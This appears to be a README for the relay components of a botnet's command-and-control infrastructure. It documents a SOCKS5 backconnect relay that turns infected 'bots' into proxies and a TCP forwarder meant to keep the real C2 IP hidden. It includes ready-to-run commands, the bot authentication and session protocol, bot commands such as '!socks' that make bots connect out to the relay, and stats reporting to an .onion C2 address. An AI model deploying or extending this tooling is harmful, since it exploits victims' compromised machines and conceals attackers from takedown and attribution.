# Relay Binaries

Two relay servers for different purposes. Both run on separate VPS machines to keep the real C2 IP hidden.

---

## 1. relay_server — SOCKS5 Backconnect Proxy Relay

Bots connect **out** to this relay. Proxy clients connect to the SOCKS5 port. The relay bridges them together.

### Flags

| Flag | Default | Description |
|------|---------|-------------|
| `-name` | auto (external IP) | Relay name shown in stats/dashboard |
| `-cp` | `9001` | Control port — bots authenticate here (VPE1 encrypted) |
| `-sp` | `1080` | SOCKS5 port — proxy clients connect here |
| `-key` | compiled default | Auth key (must match bot config) |
| `-report` | none | C2 report URL(s), comma-separated. Relay POSTs stats every 30s |
| `-stats` | none | Stats HTTP endpoint (e.g. `0.0.0.0:9090`) |

### Usage

```bash
# Basic — just control + SOCKS ports
./relay_server -name "us-east" -cp 9001 -sp 1080 -key "YOUR_KEY"

# With C2 reporting (optional)
./relay_server -name "us-east" -cp 9001 -sp 1080 -key "YOUR_KEY" \
  -report "http://YOUR_ONION.onion/api/relays/report"

# With local stats API (optional)
./relay_server -name "us-east" -cp 9001 -sp 1080 -key "YOUR_KEY" \
  -stats "0.0.0.0:9090"
```

### How It Works

```
Proxy Client ──→ relay:1080 (SOCKS5)
                      ↕ (bridged)
Bot ──────────→ relay:9001 (control, VPE1 encrypted)
```

1. **Start relay** on a VPS
2. **Tell a bot** to backconnect: `!socks <relay_ip>:9001`
3. **Use the proxy**: `curl --socks5 <relay_ip>:1080 http://example.com`

### Bot Auth Flow

```
Bot → Relay:  RELAY_AUTH:<key>:<botID>
Relay → Bot:  RELAY_OK
```

When a SOCKS client connects, the relay signals the bot to open a data channel:

```
Relay → Bot:  RELAY_NEW:<sessionID>
Bot → Relay:  RELAY_DATA:<sessionID>   (new connection)
```

The relay then bridges the SOCKS client ↔ bot data connection.

### Reporting

If `-report` is set, the relay POSTs JSON stats to the C2 every 30 seconds:

```
POST /api/relays/report
X-Relay-Key: <key>
Content-Type: application/json

{
  "name": "us-east",
  "activeSessions": 3,
  "totalSessions": 150,
  "failedSessions": 2,
  "bytesUp": 1048576,
  "bytesDown": 5242880,
  "connectedBots": 10,
  "authFailures": 0
}
```

### Stats API

If `-stats` is set, query it with the auth key:

```bash
# JSON
curl -H "X-Relay-Key: YOUR_KEY" http://relay:9090/stats

# Human-readable
curl -H "X-Relay-Key: YOUR_KEY" http://relay:9090/text

# Or via query param
curl "http://relay:9090/stats?key=YOUR_KEY"
```

### Bot Commands (from CNC)

```
!socks <relay_ip>:<control_port>    # Start SOCKS via relay backconnect
!stopsocks                           # Stop proxy on bot
!socksauth <user> <pass>             # Set SOCKS5 credentials
```

---

## 2. admin_relay_bin — Admin Telnet Relay

Pure TCP forwarder that hides the real C2 IP from admin/telnet users. Zero protocol awareness — just pipes bytes.

### Flags

| Flag | Default | Description |
|------|---------|-------------|
| `-listen` | `420` | Comma-separated ports to listen on |
| `-backend` | *required* | Real C2 address:port to forward to |

### Usage

```bash
# Single port
./admin_relay_bin -listen 420 -backend 10.0.0.5:420

# Multiple ports
./admin_relay_bin -listen 420,1337,9999 -backend 10.0.0.5:420
```

### How It Works

```
Admin/User ──→ relay_vps:420 ──→ real_c2:420
              (public IP)        (hidden IP)
```

- Users connect to the relay VPS via telnet
- Relay opens a connection to the real C2 backend
- Bidirectional pipe — everything passes through transparently
- 10 second connection timeout to backend
- Works with telnet login, TUI, any raw TCP protocol

### Example Setup

```bash
# Real C2 is at 10.0.0.5:420 (private)
# Relay VPS is at 45.33.22.11 (public)

# On relay VPS:
./admin_relay_bin -listen 420 -backend 10.0.0.5:420

# Users connect to:
telnet 45.33.22.11 420
# They see the normal login — C2 IP stays hidden
```
